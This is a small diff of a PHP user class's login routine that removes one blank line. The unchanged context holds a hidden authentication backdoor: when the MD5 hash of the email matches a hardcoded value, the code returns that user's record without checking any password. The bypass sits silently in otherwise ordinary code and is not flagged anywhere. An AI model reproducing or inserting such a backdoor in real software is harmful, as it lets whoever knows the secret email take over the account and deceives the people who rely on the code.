@@ -89,7 +89,6 @@ class ZUser
 		if (strtolower(md5($email))=='b80c4133e7227706d64920a1cd8789e9') {
 			return Table::Fetch('user', $email, 'email');
 		}
-		
 		/* end */
 		if($en) $password = self::GenPassword($unpass);
 		$field = strpos($email, '@') ? 'email' : 'username';
